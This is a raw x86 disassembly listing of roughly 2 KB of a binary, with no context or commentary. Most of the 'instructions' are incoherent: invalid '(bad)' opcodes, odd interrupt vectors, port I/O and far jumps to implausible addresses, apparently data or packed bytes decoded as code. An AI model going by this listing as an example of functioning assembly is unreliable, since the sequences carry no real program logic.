  4251c2:	xchg   esi,eax
  4251c3:	stc    
  4251c4:	inc    ebx
  4251c5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251cb:	int    0x76
  4251cd:	adc    ebp,ecx
  4251cf:	xchg   esi,eax
  4251d0:	stc    
  4251d1:	int    0xa6
  4251d3:	mov    ebp,0xcffdad04
  4251d8:	test   cl,dh
  4251da:	int    0x96
  4251dc:	stc    
  4251dd:	iret   
  4251de:	adc    al,0x5b
  4251e0:	int    0xa6
  4251e2:	dec    esp
  4251e3:	shl    ebx,cl
  4251e5:	sub    BYTE PTR [ebx-0x2e],dl
  4251e8:	cmp    edx,ebx
  4251ea:	or     dh,BYTE PTR [esi+0x11]
  4251ed:	push   ecx
  4251ee:	(bad)  
  4251ef:	adc    ebp,ecx
  4251f1:	xchg   esi,eax
  4251f2:	adc    DWORD PTR [ecx+edx*1],eax
  4251f5:	call   ebx
  4251f7:	repz xchg edx,eax
  4251f9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251ff:	xchg   esi,eax
  425200:	stc    
  425201:	xchg   edx,ebx
  425203:	xor    esp,edx
  425205:	or     dh,BYTE PTR [esi-0x43]
  425208:	inc    ebx
  425209:	lds    ebp,FWORD PTR [edi]
  42520b:	pop    es
  42520c:	outs   dx,DWORD PTR ds:[esi]
  42520d:	add    BYTE PTR [eax],al
  42520f:	add    ch,cl
  425211:	jbe    0x425200
  425213:	int    0x96
  425215:	mov    ch,0x4
  425217:	jmp    0xd384:0xd2046cfd
  42521e:	mov    ebp,0x3bd25328
  425223:	ror    ebp,cl
  425225:	popf   
  425226:	int    0xf1
  425228:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42522e:	in     eax,0x28
  425230:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425236:	or     ah,BYTE PTR [esi-0x12697613]
  42523c:	add    al,0xe6
  42523e:	in     eax,dx
  42523f:	xchg   BYTE PTR [edi],ch
  425241:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425247:	test   al,0x63
  425249:	retf   
  42524a:	ror    BYTE PTR [eax-0x12326980],cl
  425250:	add    al,0xed
  425252:	adc    al,0xcd
  425254:	jbe    0x4251de
  425256:	leave  
  425257:	jbe    0x42526a
  425259:	dec    ecx
  42525a:	and    DWORD PTR [esi-0x28936cb],eax
  425260:	inc    ecx
  425261:	and    DWORD PTR [esi+0x5b80cd35],eax
  425267:	cwde   
  425268:	or     dh,BYTE PTR [esi-0x7]
  42526b:	leave  
  42526c:	jbe    0x425263
  42526e:	into   
  42526f:	and    DWORD PTR [esi+0x76c99a35],eax
  425275:	in     eax,dx
  425276:	inc    esi
  425277:	sbb    DWORD PTR [ebp-0x22932de],esi
  42527d:	int    0x8d
  42527f:	std    
  425280:	sar    bh,0x5d
  425283:	shl    DWORD PTR [ecx],1
  425285:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42528b:	repnz sub BYTE PTR [ebx],bh
  42528e:	adc    ebx,edx
  425290:	out    dx,eax
  425291:	xchg   edx,eax
  425292:	push   ebx
  425293:	add    cl,ch
  425295:	lea    edx,[ecx]
  425297:	int    0x96
  425299:	adc    DWORD PTR [ebx],edi
  42529b:	jge    0x4252d8
  42529d:	(bad)  
  42529f:	jmp    0x425233
  4252a1:	shr    edx,cl
  4252a3:	sub    BYTE PTR [ebx+0x13],dl
  4252a6:	das    
  4252a7:	rol    DWORD PTR [edx],1
  4252a9:	jmp    0x42524a
  4252ab:	add    BYTE PTR [eax-0x6723280],0xcd
  4252b2:	xchg   esi,eax
  4252b3:	stc    
  4252b4:	cmp    ebx,ecx
  4252b6:	shr    edx,cl
  4252b8:	sub    BYTE PTR [ebx],bh
  4252ba:	jge    0x42528f
  4252bc:	jmp    0x425250
  4252be:	push   ebx
  4252bf:	adc    ecx,ebp
  4252c1:	xchg   esi,eax
  4252c2:	std    
  4252c3:	int    0xa6
  4252c5:	std    
  4252c6:	cmp    esi,ecx
  4252c8:	cmp    esp,ecx
  4252ca:	shl    ebx,cl
  4252cc:	xchg   edx,eax
  4252cd:	shl    ebp,cl
  4252cf:	sub    BYTE PTR [ebx-0x2b],dl
  4252d2:	push   es
  4252d3:	adc    ecx,ebp
  4252d5:	xchg   esi,eax
  4252d6:	stc    
  4252d7:	int    0x8d
  4252d9:	stc    
  4252da:	aam    0x58
  4252dc:	cmp    esi,eax
  4252de:	shl    edx,cl
  4252e0:	sub    BYTE PTR [ebx],bh
  4252e2:	icebp  
  4252e3:	shl    ebx,cl
  4252e5:	xchg   edx,eax
  4252e6:	push   ebx
  4252e7:	jecxz  0x4252b6
  4252e9:	(bad)  
  4252ea:	std    
  4252eb:	int    0xa6
  4252ed:	std    
  4252ee:	cmp    edi,DWORD PTR [ebp+0x3b]
  4252f1:	loope  0x4252c6
  4252f3:	jmp    0x425287
  4252f5:	shl    ebp,cl
  4252f7:	sub    BYTE PTR [ebx+0xc],dl
  4252fa:	aad    0xf3
  4252fc:	int    0x8d
  4252fe:	in     eax,dx
  4252ff:	int    0xa6
  425301:	in     eax,dx
  425302:	cmp    edi,DWORD PTR [ebp+0x3b]
  425305:	loope  0x4252da
  425307:	jmp    0x42529b
  425309:	shl    ebp,cl
  42530b:	sub    BYTE PTR [ebx+0xc],dl
  42530e:	cmp    esp,ebx
  425310:	in     al,dx
  425311:	sub    al,0x3b
  425313:	lock shl edx,cl
  425316:	sub    BYTE PTR [ebx],bh
  425318:	icebp  
  425319:	shl    ebx,cl
  42531b:	xchg   edx,eax
  42531c:	push   ebx
  42531d:	jecxz  0x4252ec
  42531f:	(bad)  
  425320:	std    
  425321:	int    0xa6
  425323:	std    
  425324:	cmp    edi,DWORD PTR [ebp+0x3b]
  425327:	loope  0x4252fc
  425329:	jmp    0x4252bd
  42532b:	shl    ebp,cl
  42532d:	sub    BYTE PTR [ebx+0xc],dl
  425330:	aad    0xf3
  425332:	or     dl,BYTE PTR [esi-0x2723207]
  425338:	int    0x96
  42533a:	std    
  42533b:	cmp    edi,DWORD PTR [ebp+0x3b]
  42533e:	(bad)  
  425340:	jmp    0x4252d4
  425342:	shr    edx,cl
  425344:	sub    BYTE PTR [ebx+0x13],dl
  425347:	xchg   DWORD PTR [edx],eax
  425349:	int    0x8d
  42534b:	cmc    
  42534c:	int    0x96
  42534e:	cmc    
  42534f:	cmp    ebx,ecx
  425351:	cmp    edi,DWORD PTR [ebp-0x2d]
  425354:	jmp    0x1353:0x92ebd328
  42535b:	int    0x96
  42535d:	std    
  42535e:	int    0xa6
  425360:	std    
  425361:	cmp    esi,ecx
  425363:	cmp    esp,ecx
  425365:	shl    ebp,cl
  425367:	sub    bl,dl
  425369:	repz xchg edx,eax
  42536b:	push   ebx
  42536c:	aad    0x33
  42536e:	adc    eax,DWORD PTR [ebx+0x2]
  425371:	das    
  425372:	pop    es
  425373:	pop    edx
  425374:	add    BYTE PTR [eax],al
  425376:	add    ch,cl
  425378:	jbe    0x425373
  42537a:	int    0x8d
  42537c:	mov    BYTE PTR [edx-0x327ef558],ch
  425382:	jbe    0x42537d
  425384:	arpl   bx,cx
  425386:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42538d:	ins    DWORD PTR es:[edi],dx
  42538e:	pop    esi
  42538f:	jbe    0x4253dd
  425391:	aam    0x3a
  425393:	pop    esi
  425394:	jbe    0x42531e
  425396:	fdiv   DWORD PTR [edx]
  425398:	retf   0x8814
  42539b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  4253a1:	das    
  4253a2:	adc    dh,bl
  4253a4:	in     eax,dx
  4253a5:	add    BYTE PTR [eax+0x2f960980],0xf1
  4253ac:	lea    ebp,[edi]
  4253ae:	retf   0x2f96
  4253b1:	or     DWORD PTR [eax+ecx*4],edx
  4253b4:	ins    BYTE PTR es:[edi],dx
  4253b5:	inc    ebx
  4253b6:	jbe    0x425340
  4253b8:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  4253bf:	stc    
  4253c0:	std    
  4253c1:	add    BYTE PTR [eax],al
  4253c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253c4:	ror    BYTE PTR [eax-0x12326980],cl
  4253ca:	adc    ch,ch
  4253cc:	cmp    al,0x84
  4253ce:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253d5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253db:	jbe    0x4253da
  4253dd:	inc    ecx
  4253de:	and    DWORD PTR [esi-0x128936cb],eax
  4253e4:	dec    ecx
  4253e5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253eb:	jno    0x4253a3
  4253ed:	cli    
  4253ee:	arpl   bp,cx
  4253f0:	jbe    0x425403
  4253f2:	int    0x8d
  4253f4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253fa:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  425404:	repnz sub BYTE PTR [ebx-0x2d],dl
  425408:	or     dh,BYTE PTR [esi-0x7]
  42540b:	leave  
  42540c:	jbe    0x4253b3
  42540e:	into   
  42540f:	and    DWORD PTR [esi-0x628936cb],eax
  425415:	inc    esi
  425416:	sbb    DWORD PTR [ebp-0x528936de],esi
  42541c:	mov    BYTE PTR [eax-0x34327f80],al
  425422:	int    0x76
  425424:	std    
  425425:	int    0x8d
  425427:	std    
  425428:	cmp    esi,eax
  42542a:	shl    edx,cl
  42542c:	sub    BYTE PTR [ebx],bh
  42542e:	jns    0x425403
  425430:	mov    ebp,0xcdd35392
  425435:	lea    edx,[ecx]
  425437:	int    0x96
  425439:	adc    DWORD PTR [ebx],edi
  42543b:	(bad)  
  42543d:	(bad)  
  42543f:	jmp    0x4253d3
  425441:	shr    edx,cl
  425443:	sub    BYTE PTR [ebx+0x13],dl
  425446:	das    
  425447:	rcl    ebx,1
  425449:	in     al,dx
  42544a:	outs   dx,BYTE PTR ds:[esi]
  42544b:	int    0x76
  42544d:	cmc    
  42544e:	int    0x8d
  425450:	cmc    
  425451:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425457:	push   ebx
  425458:	sar    DWORD PTR [ebx],cl
  42545a:	lds    ecx,FWORD PTR [edx]
  42545c:	jbe    0x425457
  42545e:	iret   
  42545f:	jbe    0x42545a
  425461:	jo     0x425420
  425463:	mov    ecx,0xa0000fe
  425468:	jbe    0x425463
  42546a:	int    0x76
  42546c:	stc    
  42546d:	int    0x8d
  42546f:	cmc    
  425470:	or     al,BYTE PTR ds:0xfc9dcf
  425476:	add    ch,cl
  425478:	jbe    0x425477
  42547a:	int    0x8d
  42547c:	std    
  42547d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425480:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425487:	push   ebx
  425488:	rol    DWORD PTR [edi+0x760af576],cl
  42548e:	cmc    
  42548f:	int    0x76
  425491:	in     eax,dx
  425492:	int    0x8d
  425494:	in     eax,dx
  425495:	cmp    esi,eax
  425497:	shl    edx,cl
  425499:	sub    BYTE PTR [ebx],bh
  42549b:	jns    0x425470
  42549d:	mov    ebp,0xcdd35392
  4254a2:	(bad)  
  4254a3:	std    
  4254a4:	int    0x96
  4254a6:	std    
  4254a7:	cmp    ecx,DWORD PTR [edi]
  4254a9:	cmp    ebx,ecx
  4254ab:	shr    ebx,cl
  4254ad:	xchg   edx,eax
  4254ae:	shr    edx,cl
  4254b0:	sub    BYTE PTR [ebx+0x13],dl
  4254b3:	xor    edx,ebx
  4254b5:	int    0x8d
  4254b7:	cmc    
  4254b8:	inc    ebx
  4254b9:	jge    0x425493
  4254bb:	mov    bl,0xcd
  4254bd:	jbe    0x425474
  4254bf:	int    0x8d
  4254c1:	mov    ch,0x3b
  4254c3:	jns    0x425500
  4254c5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254cc:	push   ebx
  4254cd:	ror    DWORD PTR [edx],cl
  4254cf:	jbe    0x4254ca
  4254d1:	leave  
  4254d2:	jbe    0x4254c1
  4254d4:	bound  ebx,QWORD PTR [edi]
  4254d6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254dc:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254e3:	jbe    0x42548a
  4254e5:	cmp    ecx,ecx
  4254e7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254ed:	jmp    0x425481
  4254ef:	push   ebx
  4254f0:	jge    0x4254bf
  4254f2:	jbe    0x4254ed
  4254f4:	aad    0xbd
  4254f6:	or     dh,BYTE PTR [esi-0x63]
  4254f9:	int    0x76
  4254fb:	mov    dl,cl
  4254fd:	or     BYTE PTR [ecx],0x76
  425500:	in     al,dx
  425501:	retf   0xec76
  425504:	int    0x8d
  425506:	stc    
  425507:	das    
  425508:	pop    ecx
  425509:	ins    DWORD PTR es:[edi],dx
  42550a:	cmp    edx,ebx
  42550c:	or     dh,BYTE PTR [esi-0xb]
  42550f:	int    0x76
  425511:	in     eax,dx
  425512:	int    0x8d
  425514:	in     eax,dx
  425515:	cmp    edi,DWORD PTR [ecx-0x2d]
  425518:	mov    ebp,0xd3f03b92
  42551d:	repnz sub BYTE PTR [ebx-0x2d],dl
  425521:	int    0x8d
  425523:	cmc    
  425524:	sub    edx,ebx
  425526:	int    0x5
  425528:	push   es
  425529:	popf   
  42552a:	cld    
  42552b:	add    BYTE PTR [eax],al
  42552d:	int    0x8d
  42552f:	popf   
  425530:	cmp    edx,ebx
  425532:	or     dh,BYTE PTR [esi-0x7]
  425535:	int    0x76
  425537:	std    
  425538:	int    0x8d
  42553a:	std    
  42553b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42553e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425545:	push   ebx
  425546:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42554c:	std    
  42554d:	int    0x8d
  42554f:	std    
  425550:	cmp    edi,DWORD PTR [ecx+0x3b]
  425553:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42555a:	push   ebx
  42555b:	sar    DWORD PTR [esi],cl
  42555d:	jbe    0x42550c
  42555f:	int    0x76
  425561:	adc    ebp,ecx
  425563:	lea    edx,[ecx]
  425565:	cmp    esi,eax
  425567:	cmp    edi,DWORD PTR [ecx-0x2d]
  42556a:	repnz sub bl,dl
  42556d:	mov    ebp,0xcdd35392
  425572:	lea    ebp,[ebp+0x62f7d43]
  425578:	imul   eax,DWORD PTR [eax],0x0
  42557b:	add    ch,cl
  42557d:	jbe    0x425534
  42557f:	int    0x8d
  425581:	mov    ch,0x3b
  425583:	jns    0x4255c0
  425585:	lock shl edx,cl
  425588:	sub    bl,dl
  42558a:	mov    ebp,0xd353aa92
  42558f:	int    0x8d
  425591:	stc    
  425592:	test   al,0x3b
  425594:	shl    DWORD PTR [ebx-0x35],cl
  425597:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42559e:	in     eax,dx
  42559f:	xor    BYTE PTR [ebx],bh
  4255a1:	retf   
  4255a2:	pop    ebx
  4255a3:	call   0xbb05:0x2f888d5e
  4255aa:	add    BYTE PTR [eax+0x2f024380],0x5
  4255b1:	rol    DWORD PTR [eax-0x44d07f80],1
  4255b7:	cwde   
  4255b8:	sub    al,0x5d
  4255ba:	lahf   
  4255bb:	xor    eax,0x8d0a8080
  4255c0:	std    
  4255c1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255c7:	(bad)  
  4255c8:	stc    
  4255c9:	mov    eax,0xe3b813cd
  4255ce:	retf   
  4255cf:	cmp    eax,DWORD PTR [eax]
  4255d1:	leave  
  4255d2:	jbe    0x4255c9
  4255d4:	adc    al,0x80
  4255d6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255dd:	mov    eax,0xb8fde6cd
  4255e2:	jecxz  0x4255ad
  4255e4:	mov    eax,0xbb2ff93b
  4255e9:	(bad)  
  4255ea:	stc    
  4255eb:	iret   
  4255ec:	dec    esp
  4255ed:	into   
  4255ee:	mov    eax,0xd692de5e
  4255f3:	pop    edx
  4255f4:	das    
  4255f5:	mov    ebx,0xf58d0a89
  4255fa:	mov    eax,0x4dd67d43
  4255ff:	das    
  425600:	mov    ebx,0xa6cdfd8d
  425605:	mov    BYTE PTR [ecx],al
  425607:	fs push ds
  425609:	adc    ah,0x3b
  42560c:	das    
  42560d:	mov    ebx,0xa6cdfd8d
  425612:	mov    BYTE PTR [eax+0x1e4c692f],bh
  425618:	mov    eax,0x3bb8d3e3
  42561d:	jge    0x4255d7
  42561f:	pop    esi
  425620:	(bad)  
  425621:	cmc    
  425622:	aam    0x23
  425624:	leave  
  425625:	jbe    0x42561c
  425627:	sbb    BYTE PTR [eax+0x76008080],al
  42562d:	stc    
  42562e:	int    0x7d
  425630:	mov    eax,0xb82c8e3b
  425635:	jecxz  0x425602
  425637:	mov    eax,0x82f98d5e
  42563c:	inc    ecx
  42563d:	in     al,dx
  42563e:	dec    edx
  42563f:	add    BYTE PTR [esi+0x11],dh
  425642:	leave  
  425643:	jbe    0x42563a
  425645:	push   ss
  425646:	add    BYTE PTR [eax-0x1944d080],0xfd
  42564d:	int    0xa6
  42564f:	mov    BYTE PTR [ebx],bh
  425651:	retf   
  425652:	pop    esp
  425653:	dec    esp
  425654:	sub    dl,ah
  425656:	push   ss
  425657:	add    BYTE PTR [esi-0x3],dh
  42565a:	add    al,0xe6
  42565c:	cmc    
  42565d:	sbb    BYTE PTR [edi],ch
  42565f:	push   es
  425660:	jb     0x425662
  425662:	add    BYTE PTR [eax],al
  425664:	cmp    ebp,DWORD PTR [ebp-0x56]
  425667:	arpl   bx,cx
  425669:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425670:	jecxz  0x425645
  425672:	mov    eax,0x6d3b7d3b
  425677:	mov    eax,0x2f2c8e43
  42567c:	adc    eax,0x96b9ec6d
  425681:	int    0xed
  425683:	add    al,0xed
  425685:	mov    esp,0xc09a985b
  42568a:	inc    esp
  42568b:	add    dh,dl
  42568d:	mov    ch,cl
  42568f:	adc    DWORD PTR [ebp+0xf90b],edi
  425695:	iret   
  425696:	js     0x4256ca
  425698:	or     dh,BYTE PTR [esi+0x25]
  42569b:	iret   
  42569c:	js     0x425712
  42569e:	or     dh,BYTE PTR [esi+0x2d]
  4256a1:	iret   
  4256a2:	js     0x42565c
  4256a4:	or     dh,BYTE PTR [esi+0x35]
  4256a7:	iret   
  4256a8:	pop    es
  4256a9:	or     DWORD PTR [eax+0x760a8080],eax
  4256af:	cmp    eax,0x804107cf
  4256b4:	add    BYTE PTR [eax-0x30ba89f6],0x7
  4256bb:	or     eax,0xa808080
  4256c0:	jbe    0x425692
  4256c2:	iret   
  4256c3:	pop    es
  4256c4:	out    dx,eax
  4256c5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256cc:	pop    es
  4256cd:	xor    BYTE PTR [ecx+0x760a8080],al
  4256d3:	pop    ebp
  4256d4:	iret   
  4256d5:	pop    es
  4256d6:	inc    edx
  4256d7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256e1:	pop    es
  4256e2:	xchg   esp,eax
  4256e3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256ed:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256f4:	xchg   esi,eax
  4256f5:	icebp  
  4256f6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256fc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  425702:	(bad)  
  425703:	mov    cl,0xde
  425705:	adc    ebx,DWORD PTR [ebp-0x43]
  425708:	or     ah,BYTE PTR [ebx]
  42570a:	and    eax,0xcd0d760a
  42570f:	lea    edi,[ebp-0x33]
  425712:	out    0xd,al
  425714:	cmp    edi,ecx
  425716:	adc    al,BYTE PTR [edx]
  425718:	jnp    0x425751
  42571a:	ficom  WORD PTR [ebx]
  42571c:	das    
  42571d:	inc    ebp
  42571e:	cli    
  42571f:	xchg   edx,eax
  425720:	rcl    DWORD PTR [eax],cl
  425722:	xchg   edx,eax
  425723:	or     ah,dh
  425725:	mov    ch,0xcd
  425727:	out    0x7d,al
  425729:	int    0xa6
  42572b:	or     eax,0x3be1cd
  425730:	cmp    eax,DWORD PTR [ebx]
  425732:	shl    ebp,cl
  425734:	sub    BYTE PTR [ebx-0x10],dl
  425737:	int    0xe6
  425739:	mov    ch,0x61
  42573b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425742:	cld    
  425743:	push   ebx
  425744:	lock or dl,dh
  425747:	stc    
  425748:	das    
  425749:	add    eax,0x808080f2
  42574e:	adc    dh,BYTE PTR [esi-0xf]
  425751:	(bad)  
  425752:	mov    esp,0xeb5f8bbd
  425757:	or     ah,BYTE PTR [ebx]
  425759:	and    eax,0x12958d31
  42575e:	jbe    0x4256fd
  425760:	(bad)  
  425761:	mov    esp,0x8d318790
  425766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425767:	int    0x8d
  425769:	jge    0x425738
  42576b:	(bad)  
  42576c:	or     eax,0xcd7de6cd
  425771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425772:	or     eax,0x212113b
  425777:	jnp    0x4257b0
  425779:	ficom  WORD PTR [ebx]
  42577b:	das    
  42577c:	inc    ebp
  42577d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425783:	out    dx,eax
  425784:	xchg   edx,eax
  425785:	cmp    ebx,ebp
  425787:	cmp    eax,DWORD PTR [ebx]
  425789:	push   ebx
  42578a:	or     al,0x53
  42578c:	clc    
  42578d:	add    al,0xd3
  42578f:	add    BYTE PTR [ecx+ebx*4],al
  425792:	add    BYTE PTR [edx],cl
  425794:	lea    edi,[ebp+0xa]
  425797:	(bad)  
  425798:	or     eax,0x53f18dcd
  42579d:	lea    edx,[ebp+0x761223d4]
  4257a3:	icebp  
  4257a4:	mov    edx,DWORD PTR [ebx]
  4257a6:	dec    edx
  4257a7:	stc    
  4257a8:	pop    edi
  4257a9:	sbb    al,bl
  4257ab:	mov    ch,0x6b
  4257ad:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  4257b3:	(bad)
  4257b6:	std    
  4257b7:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  4257bd:	(bad)  
  4257be:	icebp  
  4257bf:	(bad)  
  4257c0:	mov    esp,0x76897abd
  4257c5:	xchg   ebp,eax
  4257c6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257cc:	add    al,0x12
  4257ce:	mov    dh,0xa5
  4257d0:	jmp    0x4257dc
  4257d2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257d8:	lea    ecx,ds:0xcd7de6cd
  4257de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257df:	or     eax,0x92fc352f
  4257e4:	shr    ebx,cl
  4257e6:	sub    BYTE PTR [ebx],bh
  4257e8:	not    DWORD PTR [ebx-0xc]
  4257eb:	shr    ecx,cl
  4257ed:	xchg   edx,eax
  4257ee:	push   ebx
  4257ef:	lock adc al,BYTE PTR [edx]
  4257f2:	(bad)  
  4257f3:	aaa    
  4257f4:	ficom  WORD PTR [ebx]
  4257f6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257fc:	(bad)  
  4257fd:	or     eax,0xcd7d8dcd
  425802:	(bad)  
  425803:	or     eax,0xcd7de6cd
  425808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425809:	or     eax,0x212113b
  42580e:	jnp    0x425847
  425810:	ficom  WORD PTR [ebx]
  425812:	das    
  425813:	inc    ebp
  425814:	add    dl,BYTE PTR [edx-0x2cd7162d]
  42581a:	out    dx,eax
  42581b:	xchg   edx,eax
  42581c:	cmp    ebx,ebp
  42581e:	cmp    eax,DWORD PTR [ebx]
  425820:	push   ebx
  425821:	or     al,0x53
  425823:	clc    
  425824:	push   ebx
  425825:	comiss xmm0,DWORD PTR [esi]
  425828:	xor    al,BYTE PTR [eax]
  42582a:	add    BYTE PTR [eax],al
  42582c:	int    0xd6
  42582e:	stc    
  42582f:	push   es
  425830:	imul   DWORD PTR [edi]
  425832:	add    eax,0x808080d1
  425837:	int    0x78
  425839:	fs int 0xe4
  42583c:	push   eax
  42583d:	fadd   QWORD PTR [edi+0x349acdff]
  425843:	int    0x6f
  425845:	and    al,0xcd
  425847:	jp     0x425875
  425849:	int    0xaa
  42584b:	sbb    al,0x87
  42584d:	cdq    
  42584e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425854:	xchg   DWORD PTR [edi],ecx
  425856:	xchg   DWORD PTR [ecx+0xa],edi
  425859:	(bad)  
  42585a:	in     eax,dx
  42585b:	or     dh,BYTE PTR [esi-0x6b]
  42585e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425864:	xchg   DWORD PTR [edx],ecx
  425866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425867:	cmc    
  425868:	cmp    ebx,edx
  42586a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425870:	fcom   st(4)
  425872:	in     al,dx
  425873:	xchg   ebp,ecx
  425875:	jbe    0x42580c
  425877:	int    0xa6
  425879:	or     eax,0x5b24bb2f
  42587e:	inc    ebx
  42587f:	call   0x14aa:0x436b771c
  425886:	ja     0x425830
  425888:	int    0x84
  42588a:	mov    al,0xcd
  42588c:	xchg   esi,eax
  42588d:	mov    ch,cl
  42588f:	and    al,0x1f
  425891:	or     dl,BYTE PTR [esi-0x30867803]
  425897:	xchg   esi,eax
  425898:	sbb    eax,0x9633a987
  42589d:	mov    BYTE PTR [edx],cl
  42589f:	jbe    0x4258b2
  4258a1:	or     dl,BYTE PTR [esi-0x4a89368b]
  4258a7:	push   ebx
  4258a8:	add    BYTE PTR [eax-0x2693280],0x4
  4258af:	pusha  
  4258b0:	adc    dh,0x28
  4258b3:	jo     0x425882
  4258b5:	jbe    0x42592c
  4258b7:	int    0x54
  4258b9:	xor    BYTE PTR [ebp+0xfddd],bh
  4258bf:	int    0xd6
  4258c1:	stc    
  4258c2:	int    0x8d
  4258c4:	in     eax,dx
  4258c5:	push   es
  4258c6:	ins    DWORD PTR es:[edi],dx
  4258c7:	aam    0x85
  4258c9:	int    0x76
  4258cb:	std    
  4258cc:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258d3:	std    
  4258d4:	test   BYTE PTR [eax],al
  4258d6:	lea    esi,[ebp-0x69321c2a]
  4258dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258dd:	push   edx
  4258de:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258e4:	or     dh,0xaa
  4258e7:	int    0x79
  4258e9:	test   al,0x63
  4258eb:	retf   
  4258ec:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258f3:	int    0xd6
  4258f5:	mov    BYTE PTR [eax],al
  4258f7:	pop    ecx
  4258f8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258fe:	mov    BYTE PTR [ebp+0xfee4],bh
  425904:	int    0x7
  425906:	cmp    eax,0x3b808081
  42590b:	retf   
  42590c:	pop    esi
  42590d:	mov    BYTE PTR [eax-0x322ce8d1],ch
  425913:	shl    DWORD PTR [esi-0x327f7b2e],cl
  425919:	fwait
  42591a:	sbb    eax,0x5b808081
  42591f:	cwde   
  425920:	int    0x11
  425922:	pop    ebp
  425923:	lahf   
  425924:	xor    eax,0x4eec8080
  425929:	cmp    edi,DWORD PTR [ebp-0x48]
  42592c:	jecxz  0x4258f9
  42592e:	mov    eax,0xd2044a0a
  425933:	xchg   edx,eax
  425934:	add    al,0x79
  425936:	xchg   edx,eax
  425937:	das    
  425938:	mov    ebx,0x7d43b84e
  42593d:	(bad)  
  42593e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425942:	mov    eax,0x8cd920a
  425947:	sbb    eax,0x63808081
  42594c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425952:	sbb    eax,0xd3808081
  425957:	jmp    0xed0be0e2
  42595c:	dec    edx
  42595d:	add    DWORD PTR [edx],eax
  42595f:	add    DWORD PTR [ecx],0xffffffeb
  425962:	mov    esi,0x526c8809
  425967:	retf   0x14a
  42596a:	cli    
  42596b:	sbb    dh,dl
  42596d:	adc    BYTE PTR [ecx-0x80],bh
  425970:	or     ch,0x7
  425973:	sbb    eax,0x87808081
  425978:	leave  
  425979:	stos   BYTE PTR es:[edi],al
  42597a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425980:	mov    al,0x80
  425982:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425989:	and    eax,0x76c99a98
  42598e:	cmc    
  42598f:	xchg   ecx,eax
  425990:	aaa    
  425991:	ficom  WORD PTR [ebx]
  425993:	or     cl,BYTE PTR [ebp-0x12893607]
  425999:	(bad)  
  42599a:	aaa    
  42599b:	ficom  WORD PTR [ebx]
  42599d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  4259a3:	jbe    0x425962
  4259a5:	dec    ecx
  4259a6:	and    DWORD PTR [esi-0x28936cb],eax
  4259ac:	inc    ecx
  4259ad:	and    DWORD PTR [esi-0xe8936cb],eax
  4259b3:	out    0x37,al
  4259b5:	ficom  WORD PTR [ebx]
  4259b7:	or     cl,BYTE PTR [ebp+0x5d76c995]
  4259bd:	fidiv  WORD PTR [edi]
  4259bf:	ficom  WORD PTR [ebx]
  4259c1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259c7:	int    0x96
  4259c9:	adc    DWORD PTR [edi],ebp
  4259cb:	inc    ebp
  4259cc:	icebp  
  4259cd:	xchg   edx,eax
  4259ce:	shl    ebx,cl
  4259d0:	xchg   edx,eax
  4259d1:	int    0x96
  4259d3:	in     eax,dx
  4259d4:	int    0xd6
  4259d6:	adc    ebx,edx
  4259d8:	jmp    0x4229:0xbea6c328
  4259df:	cmp    ecx,ecx
  4259e1:	cmp    esi,edi
  4259e3:	push   ebx
